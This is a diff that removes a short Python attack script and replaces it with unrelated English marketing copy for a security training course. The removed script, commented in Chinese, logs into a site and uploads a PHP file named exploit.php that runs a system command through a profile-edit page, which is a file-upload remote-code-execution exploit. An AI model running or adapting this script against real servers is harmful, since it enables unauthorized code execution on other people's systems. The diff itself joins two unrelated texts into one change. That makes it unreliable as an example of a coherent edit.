@@ -1,30 +1,32 @@
-import requests
-from bs4 import BeautifulSoup
+Product Description: Safety Technology Training Course
 
-# 初始化一个会话对象
-session = requests.Session()
+Our safety technical training courses are designed to provide comprehensive, practical safety awareness and skills training to help you and your team effectively prevent and solve various safety challenges.
 
-# 登录页面和目标 URL
-login_url = 'http://example.com/login/'
-target_url = 'http://example.com/staff/edit-my-profile.php'
+Course Highlights:
 
-# 模拟登录所需的数据
-login_data = {
-    'username': 'your_username',  # 替换为实际用户名
-    'password': 'your_password'   # 替换为实际密码
-}
+Comprehensiveness: Our courses cover a wide range of areas, including cybersecurity, data protection, physical security and crisis management, ensuring that participants have a comprehensive understanding of all aspects of security.
 
-# 模拟登录
-response = session.post(login_url, data=login_data)
+Practicality: The content of the course focuses on practical application. Through case analysis, simulation exercise and interactive learning, students can directly apply what they have learned to practical work.
 
-# 检查登录是否成功，然后进行文件上传
-if response.ok:
-    # 要上传的 PHP 脚本
-    php_payload = '<?php exec("calc.exe"); ?>'
-    files = {'uploaded_file': ('exploit.php', php_payload)}
-    
-    # 上传文件
-    response = session.post(target_url, files=files)
-    print(response.text)
-else:
-    print("登录失败")
+Professional guidance: We have a team of experienced safety experts to provide professional guidance and personalized support to students to ensure that they receive the best coaching and advice during their learning process.
+
+Flexibility: Our courses can be tailored to your and your team's needs, including course content, timing and training methods, to ensure that they best meet your requirements.
+
+Applicable object:
+
+enterprise employees
+IT professionals
+managers
+Students and educational institutions
+Course Content:
+
+Network Security Basics
+data privacy and protection
+Physical security management
+Crisis management and risk assessment
+security awareness training
+Why choose our safety technology training courses?
+
+We are committed to providing you with the highest quality training in security techniques, enabling you and your team to respond more confidently to increasingly complex security threats.Our courses are not only knowledge transfer, but also the cultivation of practical skills, providing you with safety in work and life.
+
+Contact us for more information or to schedule a custom course and let's build a safer environment together!
